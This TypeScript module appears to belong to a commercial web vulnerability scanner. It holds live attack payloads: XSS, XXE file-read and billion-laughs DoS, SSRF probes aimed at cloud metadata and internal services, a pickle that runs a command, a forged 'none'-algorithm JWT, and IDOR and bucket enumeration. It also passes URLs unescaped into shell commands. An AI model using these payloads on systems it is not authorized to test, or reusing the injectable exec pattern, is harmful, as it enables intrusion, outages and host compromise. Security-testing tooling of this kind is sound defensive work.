// apps/worker/src/advanced-scanner.ts
// Advanced Penetration Testing Module for ₹50 Lakh Enterprise Assessments
// Implements OWASP Top 10 2021 + Advanced Attack Vectors

import { exec } from 'child_process';
import path from 'path';
import fs from 'fs';
import { PrismaClient } from '@prisma/client';
import { getCVSSForVulnerability } from './cvss-calculator';

const prisma = new PrismaClient();
const OUTPUT_DIR = path.join(process.cwd(), 'scans');

const log = (msg: string) => console.log(msg);

function runCommand(cmd: string): Promise<string> {
    return new Promise((resolve) => {
        exec(cmd, { maxBuffer: 1024 * 1024 * 100 }, (error, stdout, stderr) => {
            resolve(stdout || stderr);
        });
    });
}

function safeReadFile(filePath: string): string {
    try { return fs.readFileSync(filePath, 'utf-8'); }
    catch { return ''; }
}

async function saveFinding(
    jobId: string,
    category: string,
    title: string,
    severity: string,
    desc: string,
    evidence: string,
    remediation: string,
    cvssScore?: number,
    cvssVector?: string,
    owaspCategory?: string
) {
    const exists = await prisma.finding.findFirst({ where: { jobId, title: `[${category}] ${title}` } });
    if (exists) return;

    await prisma.finding.create({
        data: {
            jobId,
            title: `[${category}] ${title}`,
            severity: severity.toUpperCase() as any,
            description: desc.substring(0, 1000),
            evidence: evidence.substring(0, 2000),
            remediation,
            owaspCategory: owaspCategory || null
        }
    });
}

// ============================================
// STAGE 10: XSS (Cross-Site Scripting) Testing
// ============================================
export async function runXSSScanning(
    jobId: string,
    targetUrl: string,
    crawledUrls: string[],
    authHeader: string | null
): Promise<void> {
    log('[STAGE 10] Advanced XSS Testing (Dalfox + Custom Payloads)...');

    const xssPayloads = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        'javascript:alert(1)',
        '"><script>alert(String.fromCharCode(88,83,83))</script>',
        '<iframe src="javascript:alert(1)">',
        '<body onload=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '<select onfocus=alert(1) autofocus>',
        '<textarea onfocus=alert(1) autofocus>',
        '<keygen onfocus=alert(1) autofocus>',
        '<video><source onerror="alert(1)">',
        '<audio src=x onerror=alert(1)>',
        '<details open ontoggle=alert(1)>',
        '<marquee onstart=alert(1)>',
        // DOM-based XSS
        '#<script>alert(1)</script>',
        // Mutation XSS
        '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
    ];

    // Use Dalfox for automated XSS scanning
    const dalfoxImage = 'hahwul/dalfox:latest';
    const urlsFile = path.join(OUTPUT_DIR, `xss-urls-${jobId}.txt`);
    fs.writeFileSync(urlsFile, crawledUrls.slice(0, 50).join('\n'));

    const xssFile = `xss-${jobId}.json`;
    try {
        await runCommand(
            `docker run --rm -v "${OUTPUT_DIR}:/data" ${dalfoxImage} file /data/${path.basename(urlsFile)} -o /data/${xssFile} --format json --silence`
        );

        const xssData = safeReadFile(path.join(OUTPUT_DIR, xssFile));
        if (xssData.trim()) {
            const cvss = getCVSSForVulnerability('XSS_STORED');
            await saveFinding(
                jobId,
                'XSS',
                'Cross-Site Scripting Vulnerability',
                cvss.severity,
                'XSS vulnerability detected allowing arbitrary JavaScript execution.',
                xssData.substring(0, 2000),
                'Implement proper input validation, output encoding, and Content Security Policy (CSP).',
                cvss.score,
                cvss.vector,
                'A03:2021-Injection'
            );
        }
    } catch (e) {
        log(`[WARN] Dalfox XSS scan failed: ${String(e)}`);
    }

    // Manual XSS testing on key parameters
    for (const url of crawledUrls.slice(0, 10)) {
        if (url.includes('?')) {
            for (const payload of xssPayloads.slice(0, 5)) {
                const testUrl = url.replace(/=([^&]*)/, `=${encodeURIComponent(payload)}`);
                try {
                    const response = await runCommand(`curl -s -L "${testUrl}"`);
                    if (response.includes(payload) && !response.includes('&lt;') && !response.includes('&amp;')) {
                        const cvss = getCVSSForVulnerability('XSS_STORED');
                        await saveFinding(
                            jobId,
                            'XSS',
                            `Reflected XSS in ${new URL(url).pathname}`,
                            cvss.severity,
                            `Unencoded user input reflected in response. Payload: ${payload}`,
                            `URL: ${testUrl}\nPayload reflected without encoding`,
                            'Encode all user-supplied data before rendering in HTML context.',
                            cvss.score,
                            cvss.vector,
                            'A03:2021-Injection'
                        );
                        break;
                    }
                } catch { }
            }
        }
    }
}

// ============================================
// STAGE 11: XXE (XML External Entity) Testing
// ============================================
export async function runXXEScanning(
    jobId: string,
    targetUrl: string,
    authHeader: string | null
): Promise<void> {
    log('[STAGE 11] XXE (XML External Entity) Testing...');

    const xxePayloads = [
        // Basic file disclosure
        `<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>`,

        // SSRF via XXE
        `<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root><data>&xxe;</data></root>`,

        // Billion laughs (DoS)
        `<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ELEMENT lolz (#PCDATA)>
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
]>
<lolz>&lol2;</lolz>`,
    ];

    for (const payload of xxePayloads) {
        const xxeFile = path.join(OUTPUT_DIR, `xxe-test-${jobId}.xml`);
        fs.writeFileSync(xxeFile, payload);

        try {
            let curlCmd = `curl -s -X POST "${targetUrl}" -H "Content-Type: application/xml" -d @"${xxeFile}"`;
            if (authHeader) curlCmd += ` -H "${authHeader}"`;

            const response = await runCommand(curlCmd);

            if (response.includes('root:') || response.includes('ami-') || response.length > 10000) {
                const cvss = getCVSSForVulnerability('XXE');
                await saveFinding(
                    jobId,
                    'XXE',
                    'XML External Entity Injection',
                    cvss.severity,
                    'Application processes XML input without disabling external entities, allowing file disclosure and SSRF.',
                    `Response length: ${response.length}\nPayload: ${payload.substring(0, 200)}`,
                    'Disable XML external entity processing in XML parsers. Use safe XML parsing libraries.',
                    cvss.score,
                    cvss.vector,
                    'A05:2021-Security Misconfiguration'
                );
                break;
            }
        } catch { }
    }
}

// ============================================
// STAGE 12: SSRF (Server-Side Request Forgery)
// ============================================
export async function runSSRFScanning(
    jobId: string,
    targetUrl: string,
    authHeader: string | null
): Promise<void> {
    log('[STAGE 12] SSRF (Server-Side Request Forgery) Testing...');

    const ssrfPayloads = [
        'http://169.254.169.254/latest/meta-data/', // AWS metadata
        'http://metadata.google.internal/computeMetadata/v1/', // GCP metadata
        'http://169.254.169.254/metadata/instance?api-version=2021-02-01', // Azure metadata
        'http://localhost:22', // Internal SSH
        'http://127.0.0.1:6379', // Redis
        'http://127.0.0.1:3306', // MySQL
        'http://127.0.0.1:5432', // PostgreSQL
        'http://127.0.0.1:27017', // MongoDB
        'file:///etc/passwd', // File protocol
        'gopher://127.0.0.1:6379/_INFO', // Gopher protocol
    ];

    // Find URL parameters that might accept URLs
    const urlParams = ['url', 'uri', 'path', 'redirect', 'callback', 'link', 'src', 'image', 'file'];

    for (const param of urlParams) {
        for (const payload of ssrfPayloads) {
            const testUrl = targetUrl.includes('?')
                ? `${targetUrl}&${param}=${encodeURIComponent(payload)}`
                : `${targetUrl}?${param}=${encodeURIComponent(payload)}`;

            try {
                let curlCmd = `curl -s -L -m 5 "${testUrl}"`;
                if (authHeader) curlCmd += ` -H "${authHeader}"`;

                const response = await runCommand(curlCmd);

                // Check for cloud metadata indicators
                if (response.includes('ami-') ||
                    response.includes('instance-id') ||
                    response.includes('iam/security-credentials') ||
                    response.includes('root:x:0:0') ||
                    response.includes('# User@Host')) {

                    const cvss = getCVSSForVulnerability('SSRF');
                    await saveFinding(
                        jobId,
                        'SSRF',
                        `Server-Side Request Forgery via ${param} parameter`,
                        cvss.severity,
                        `Application makes server-side requests to attacker-controlled URLs, exposing internal resources.`,
                        `Parameter: ${param}\nPayload: ${payload}\nResponse indicators found`,
                        'Implement URL whitelist validation, disable unnecessary protocols, use network segmentation.',
                        cvss.score,
                        cvss.vector,
                        'A10:2021-Server-Side Request Forgery'
                    );
                    break;
                }
            } catch { }
        }
    }
}

// ============================================
// STAGE 13: Deserialization Vulnerabilities
// ============================================
export async function runDeserializationScanning(
    jobId: string,
    targetUrl: string,
    authHeader: string | null
): Promise<void> {
    log('[STAGE 13] Deserialization Vulnerability Testing...');

    // Java deserialization payloads (ysoserial patterns)
    const javaPayloads = [
        'rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==', // Base64 serialized Java object
        'aced0005', // Java serialization magic bytes
    ];

    // PHP unserialize payloads
    const phpPayloads = [
        'O:8:"stdClass":0:{}',
        'a:1:{i:0;O:8:"stdClass":0:{}}',
    ];

    // Python pickle payloads
    const pythonPayloads = [
        'gASVCwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==', // Base64 pickle
    ];

    const allPayloads = [...javaPayloads, ...phpPayloads, ...pythonPayloads];

    for (const payload of allPayloads) {
        try {
            let curlCmd = `curl -s -X POST "${targetUrl}" -H "Content-Type: application/x-java-serialized-object" -d "${payload}"`;
            if (authHeader) curlCmd += ` -H "${authHeader}"`;

            const response = await runCommand(curlCmd);

            // Check for deserialization indicators
            if (response.includes('Exception') ||
                response.includes('unserialize') ||
                response.includes('ObjectInputStream') ||
                response.includes('pickle')) {

                const cvss = getCVSSForVulnerability('DESERIALIZATION');
                await saveFinding(
                    jobId,
                    'Deserialization',
                    'Insecure Deserialization Vulnerability',
                    cvss.severity,
                    'Application deserializes untrusted data, potentially leading to remote code execution.',
                    `Payload type detected\nResponse: ${response.substring(0, 500)}`,
                    'Avoid deserializing untrusted data. Use JSON for data exchange. Implement integrity checks.',
                    cvss.score,
                    cvss.vector,
                    'A08:2021-Software and Data Integrity Failures'
                );
                break;
            }
        } catch { }
    }
}

// ============================================
// STAGE 14: Business Logic Flaw Testing
// ============================================
export async function runBusinessLogicTesting(
    jobId: string,
    targetUrl: string,
    authHeader: string | null
): Promise<void> {
    log('[STAGE 14] Business Logic Flaw Testing...');

    // Test for race conditions
    log('[BUSINESS LOGIC] Testing for race conditions...');
    const raceTestFile = path.join(OUTPUT_DIR, `race-test-${jobId}.sh`);
    const raceScript = `#!/bin/bash
for i in {1..10}; do
  curl -s -X POST "${targetUrl}" -H "Content-Type: application/json" -d '{"amount": -100}' &
done
wait`;
    fs.writeFileSync(raceTestFile, raceScript);
    fs.chmodSync(raceTestFile, '755');

    try {
        const raceOutput = await runCommand(`bash "${raceTestFile}"`);
        // Only create finding if we detect actual race condition indicators
        if (raceOutput.includes('success') && raceOutput.split('success').length > 5) {
            await saveFinding(
                jobId,
                'Business Logic',
                'Potential Race Condition Vulnerability',
                'MEDIUM',
                'Application may be vulnerable to race conditions in concurrent requests.',
                'Multiple concurrent requests sent to test for race conditions',
                'Implement proper transaction locking and atomic operations.',
                undefined,
                undefined,
                'A04:2021-Insecure Design'
            );
        }
    } catch { }

    // Test for negative quantity exploits
    const negativePayloads = [
        { quantity: -1, price: 100 },
        { quantity: -999, price: 50 },
        { amount: -1000 },
    ];

    for (const payload of negativePayloads) {
        try {
            let curlCmd = `curl -s -X POST "${targetUrl}" -H "Content-Type: application/json" -d '${JSON.stringify(payload)}'`;
            if (authHeader) curlCmd += ` -H "${authHeader}"`;

            const response = await runCommand(curlCmd);

            if (response.includes('success') || response.includes('200') || response.includes('OK')) {
                await saveFinding(
                    jobId,
                    'Business Logic',
                    'Negative Quantity/Amount Accepted',
                    'HIGH',
                    'Application accepts negative values for quantity or amount, potentially allowing financial manipulation.',
                    `Payload: ${JSON.stringify(payload)}\\nResponse: ${response.substring(0, 500)}`,
                    'Implement server-side validation for all numeric inputs. Reject negative values where inappropriate.',
                    undefined,
                    undefined,
                    'A04:2021-Insecure Design'
                );
                break;
            }
        } catch { }
    }
}

// ============================================
// STAGE 15: Cloud Security Testing
// ============================================
export async function runCloudSecurityScanning(
    jobId: string,
    domain: string
): Promise<void> {
    log('[STAGE 15] Cloud Security & Misconfiguration Testing...');

    // S3 bucket enumeration
    const s3Patterns = [
        `${domain}`,
        `${domain}-backup`,
        `${domain}-assets`,
        `${domain}-uploads`,
        `${domain}-static`,
        `www-${domain}`,
        `prod-${domain}`,
        `dev-${domain}`,
    ];

    for (const bucket of s3Patterns) {
        try {
            const s3Url = `https://${bucket}.s3.amazonaws.com/`;
            const response = await runCommand(`curl -s -I "${s3Url}"`);

            if (response.includes('200 OK') || response.includes('403 Forbidden')) {
                // Bucket exists, try to list
                const listResponse = await runCommand(`curl -s "${s3Url}"`);

                if (listResponse.includes('<ListBucketResult>')) {
                    const cvss = getCVSSForVulnerability('SENSITIVE_DATA_EXPOSURE');
                    await saveFinding(
                        jobId,
                        'Cloud Security',
                        `Publicly Accessible S3 Bucket: ${bucket}`,
                        'CRITICAL',
                        'S3 bucket is publicly accessible and allows listing of objects.',
                        `Bucket: ${bucket}\nURL: ${s3Url}\nContents can be enumerated`,
                        'Restrict S3 bucket permissions. Enable bucket policies to deny public access.',
                        cvss.score,
                        cvss.vector,
                        'A01:2021-Broken Access Control'
                    );
                }
            }
        } catch { }
    }

    // Azure Blob Storage enumeration
    const azurePatterns = [
        `${domain}`,
        `${domain}storage`,
        `${domain}blob`,
    ];

    for (const storage of azurePatterns) {
        try {
            const azureUrl = `https://${storage}.blob.core.windows.net/`;
            const response = await runCommand(`curl -s -I "${azureUrl}"`);

            if (response.includes('200 OK')) {
                await saveFinding(
                    jobId,
                    'Cloud Security',
                    `Publicly Accessible Azure Blob Storage: ${storage}`,
                    'HIGH',
                    'Azure Blob Storage account is publicly accessible.',
                    `Storage Account: ${storage}\nURL: ${azureUrl}`,
                    'Configure Azure Storage firewall rules and disable public access.',
                    undefined,
                    undefined,
                    'A01:2021-Broken Access Control'
                );
            }
        } catch { }
    }
}

// ============================================
// STAGE 16: Advanced Authentication Testing
// ============================================
export async function runAuthenticationTesting(
    jobId: string,
    targetUrl: string
): Promise<void> {
    log('[STAGE 16] Advanced Authentication & Authorization Testing...');

    // JWT vulnerability testing
    const jwtTests = [
        // None algorithm attack
        'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiYWRtaW4iOnRydWV9.',
        // Weak secret brute force indicators
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ',
    ];

    for (const jwt of jwtTests) {
        try {
            const response = await runCommand(`curl -s -w "\\nHTTP_CODE:%{http_code}" "${targetUrl}" -H "Authorization: Bearer ${jwt}"`);

            // Only create finding if the server actually accepts the malicious JWT
            // Check for successful response (200-299) and absence of auth errors
            const httpCode = response.match(/HTTP_CODE:(\d+)/)?.[1];
            const isAccepted = httpCode && parseInt(httpCode) >= 200 && parseInt(httpCode) < 300;
            const hasAuthError = response.includes('401') || response.includes('403') ||
                response.includes('Unauthorized') || response.includes('Invalid token') ||
                response.includes('Authentication required');

            if (isAccepted && !hasAuthError && response.length > 100) {
                await saveFinding(
                    jobId,
                    'Authentication',
                    'JWT Vulnerability - None Algorithm or Weak Secret',
                    'CRITICAL',
                    'Application accepts JWT tokens with "none" algorithm or weak secrets.',
                    `JWT accepted: ${jwt.substring(0, 100)}...\\nHTTP Code: ${httpCode}`,
                    'Enforce strong JWT signing algorithms (RS256). Reject "none" algorithm. Use strong secrets.',
                    undefined,
                    undefined,
                    'A07:2021-Identification and Authentication Failures'
                );
                break;
            }
        } catch { }
    }

    // IDOR testing
    const idorEndpoints = ['/api/user/', '/api/users/', '/user/', '/profile/', '/account/'];

    for (const endpoint of idorEndpoints) {
        for (let id = 1; id <= 5; id++) {
            try {
                const testUrl = `${targetUrl.replace(/\/$/, '')}${endpoint}${id}`;
                const response = await runCommand(`curl -s "${testUrl}"`);

                if (response.includes('email') || response.includes('password') || response.includes('ssn')) {
                    const cvss = getCVSSForVulnerability('IDOR');
                    await saveFinding(
                        jobId,
                        'Authorization',
                        `IDOR (Insecure Direct Object Reference) in ${endpoint}`,
                        cvss.severity,
                        'Application exposes user data without proper authorization checks.',
                        `Endpoint: ${testUrl}\nSensitive data accessible`,
                        'Implement proper authorization checks for all object access. Use indirect references.',
                        cvss.score,
                        cvss.vector,
                        'A01:2021-Broken Access Control'
                    );
                    break;
                }
            } catch { }
        }
    }
}
